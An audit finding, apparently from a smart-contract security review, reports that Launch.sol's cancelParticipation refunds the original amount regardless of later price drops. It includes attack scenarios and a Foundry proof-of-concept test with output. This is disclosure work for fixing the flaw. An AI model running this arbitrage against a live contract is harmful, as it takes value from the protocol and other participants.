# Price change consequences can be nullified by calling cancelParticipation

### Summary

Lack of price-aware cancellation logic allows users to avoid losses by canceling positions when token price decreases to obtain their full funds.


### Root Cause

In Launch.sol, cancelParticipation and _processRefund returns the original currency spent without adjusting to the current price. This provides an opportunity for users to buy into the token at one price and without any risk drop out if the price moves unfavorably. This differs from the implementation of updateParticipation, which makes updates based on the currentPrice.

```solidity
    function cancelParticipation(CancelParticipationRequest calldata request, bytes calldata signature)
        external
        nonReentrant
        whenNotPaused
        onlyLaunchGroupStatus(request.launchGroupId, LaunchGroupStatus.ACTIVE)
    {
        //..
        //refund based on currencyAmout when participation was created, even though the price has dropped
        uint256 refundCurrencyAmount = info.currencyAmount;
        IERC20(info.currency).safeTransfer(info.userAddress, refundCurrencyAmount);

```


### Internal Pre-conditions

1. Launch group has finalizesAtParticipation = false
2. User participates at higher price
3. Manager decreases token price

### External Pre-conditions

None

### Attack Path

Scenario 1:
1. User buys 1000 tokens at a price of 1-to-1 for $1000
2. Price updates to 0.5 units per token
3. User cancels participation
4. User receives full $1000 back
5. User can rebuy same amount at new lower price

Scenario 2:
1. User buys 1000 tokens at a price of 1-to-1 for $1000
2. Price updates to 2 units per token
3. User keeps the tokens
4. User gets finalized as a winner and sells the tokens for $2000

### Impact

Protocol vulnerable to risk-free arbitrage


### PoC

Place the PoC inside Launch.CancelParticipation.t.sol
```solidity
function testPriceArbitrageVulnerability() public {
    // Setup initial participation with price = 1
    bytes32 launchGroupId = bytes32(uint256(999));
    bytes32 participationId1 = bytes32(uint256(888)); 
    bytes32 participationId2 = bytes32(uint256(777));

    CurrencyConfig memory currencyConfig = CurrencyConfig({
        tokenPriceBps: 1 * 10 ** currency.decimals(),
        isEnabled: true
    });

    LaunchGroupSettings memory settings = LaunchGroupSettings({
        finalizesAtParticipation: false,
        startsAt: block.timestamp, 
        endsAt: block.timestamp + 1 days,
        maxTokenAllocation: 10000 * 10 ** launch.tokenDecimals(),
        minTokenAmountPerUser: 100 * 10 ** launch.tokenDecimals(),
        maxTokenAmountPerUser: 3000 * 10 ** launch.tokenDecimals(),
        status: LaunchGroupStatus.ACTIVE
    });

    vm.startPrank(manager);
    launch.createLaunchGroup(launchGroupId, address(currency), currencyConfig, settings);
    vm.stopPrank();

    // Step 1: User buys 1000 tokens when price = 1
    ParticipationRequest memory request = ParticipationRequest({
        chainId: block.chainid,
        launchId: testLaunchId,
        launchGroupId: launchGroupId,
        launchParticipationId: participationId1,
        userId: testUserId,
        userAddress: user1,
        tokenAmount: 1000 * 10**18,
        currency: address(currency),
        requestExpiresAt: block.timestamp + 1 hours
    });
    
    bytes memory signature = _signRequest(abi.encode(request));
    
    vm.startPrank(user1);
    currency.approve(address(launch), 1000 * 10**18);
    launch.participate(request, signature);
    
    ParticipationInfo memory infoAfterBuy = launch.getParticipationInfo(participationId1);
    console.log("After buying at price = 1:");
    console.log("  Tokens purchased: %d", infoAfterBuy.tokenAmount / 10**18);
    console.log("  Currency spent: %d", infoAfterBuy.currencyAmount / 10**18);
    
    // Step 2: Price decreases to 0.5
    vm.stopPrank();
    vm.startPrank(manager);
    launch.setLaunchGroupCurrency(
        launchGroupId,
        address(currency),
        CurrencyConfig({
            tokenPriceBps: 5 * 10**17,
            isEnabled: true
        })
    );
    console.log("\nPrice decreased to 0.5");
    
    // Step 3: User cancels to get full refund at original price
    vm.stopPrank();
    vm.startPrank(user1);
    
    uint256 balanceBeforeCancel = currency.balanceOf(user1);
    
    CancelParticipationRequest memory cancelRequest = CancelParticipationRequest({
        chainId: block.chainid,
        launchId: testLaunchId,
        launchGroupId: launchGroupId,
        launchParticipationId: participationId1,
        userId: testUserId,
        userAddress: user1,
        requestExpiresAt: block.timestamp + 1 hours
    });
    
    bytes memory cancelSignature = _signRequest(abi.encode(cancelRequest));
    launch.cancelParticipation(cancelRequest, cancelSignature);
    
    uint256 balanceAfterCancel = currency.balanceOf(user1);
    console.log("\nAfter cancellation:");
    console.log("  Refund received: %d", (balanceAfterCancel - balanceBeforeCancel) / 10**18);
    console.log("  Final balance: %d", balanceAfterCancel / 10**18);
}

```

Output:
```text
After buying at price = 1:
Tokens purchased: 1000
Currency spent: 1000

Price decreased to 0.5

After cancellation:
Refund received: 1000
Final balance: 1000
```

### Mitigation

Adjust refund amount/cancellation amount to take into account the current price so that users cant take advantage of risk free arbitrage.
